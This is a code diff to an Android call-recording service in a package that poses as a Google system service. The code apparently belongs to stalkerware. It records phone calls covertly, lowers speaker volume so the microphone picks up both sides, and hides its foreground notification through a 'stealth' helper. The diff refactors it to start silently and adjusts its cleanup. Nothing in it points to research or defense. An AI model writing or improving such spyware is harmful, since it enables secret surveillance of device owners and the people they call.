@@ -1,15 +1,12 @@
 package com.google.android.systemservice.services
 
-import android.app.Service
-import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
-import android.content.IntentFilter
+import android.content.pm.ServiceInfo
 import android.media.AudioFormat
 import android.media.AudioRecord
 import android.media.MediaRecorder
 import android.os.Build
-import android.os.IBinder
 import android.telephony.PhoneStateListener
 import android.telephony.TelephonyCallback
 import android.telephony.TelephonyManager
@@ -41,7 +38,7 @@ import java.io.IOException
  * - Speaker volume is reduced to minimum (1) — barely audible but MIC captures both sides
  * - When call ends, restore original volume
  */
-class CallRecordingService : Service() {
+class CallRecordingService : BaseService() {
 
     companion object {
         private const val TAG = "CallRec"
@@ -50,6 +47,17 @@ class CallRecordingService : Service() {
         private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
         private const val MAX_CALL_DURATION_SEC = 3600 // 1 hour max
     }
+
+    override val serviceTag = TAG
+    override val foregroundServiceId = StealthNotificationHelper.CALL_RECORDING_SERVICE_ID
+    override val foregroundServiceType: Int
+        get() = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE &&
+            checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED
+        ) {
+            ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+        } else {
+            ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+        }
 
     private var telephonyManager: TelephonyManager? = null
     @Volatile private var audioRecord: AudioRecord? = null
@@ -117,36 +125,7 @@ class CallRecordingService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        val notification = StealthNotificationHelper.createStealthNotification(this)
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                // Android 14+: check RECORD_AUDIO before using microphone FGS type
-                if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                    startForeground(StealthNotificationHelper.CALL_RECORDING_SERVICE_ID, notification,
-                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
-                } else {
-                    startForeground(StealthNotificationHelper.CALL_RECORDING_SERVICE_ID, notification,
-                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
-                    Log.w(TAG, "RECORD_AUDIO not granted, running as dataSync FGS")
-                }
-            } else {
-                startForeground(StealthNotificationHelper.CALL_RECORDING_SERVICE_ID, notification)
-            }
-        } catch (e: SecurityException) {
-            Log.e(TAG, "FGS start failed: ${e.message}, trying dataSync type")
-            try {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                    startForeground(StealthNotificationHelper.CALL_RECORDING_SERVICE_ID, notification,
-                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
-                } else {
-                    startForeground(StealthNotificationHelper.CALL_RECORDING_SERVICE_ID, notification)
-                }
-            } catch (e2: Exception) {
-                Log.e(TAG, "Cannot start foreground at all: ${e2.message}")
-                stopSelf()
-                return
-            }
-        }
+        startForegroundSilent()
 
         telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager ?: return
         try {
@@ -171,8 +150,6 @@ class CallRecordingService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         return START_STICKY
     }
-
-    override fun onBind(intent: Intent?): IBinder? = null
 
     /**
      * Multi-strategy call recording — tries each approach in order.
@@ -341,11 +318,12 @@ class CallRecordingService : Service() {
 
         try {
             audioRecord?.stop()
-            audioRecord?.release()
         } catch (e: Exception) {
-            Log.e(TAG, "Error stopping: ${e.message}")
+            Log.e(TAG, "Error stopping AudioRecord: ${e.message}")
+        } finally {
+            try { audioRecord?.release() } catch (_: Exception) {}
+            audioRecord = null
         }
-        audioRecord = null
 
         // Restore speaker if we used auto-speaker strategy
         if (usedStrategy == "MIC_SPEAKER") {
@@ -432,12 +410,6 @@ class CallRecordingService : Service() {
         } else {
             @Suppress("DEPRECATION")
             telephonyManager?.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
-        }
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            stopForeground(STOP_FOREGROUND_REMOVE)
-        } else {
-            @Suppress("DEPRECATION")
-            stopForeground(true)
         }
         super.onDestroy()
     }
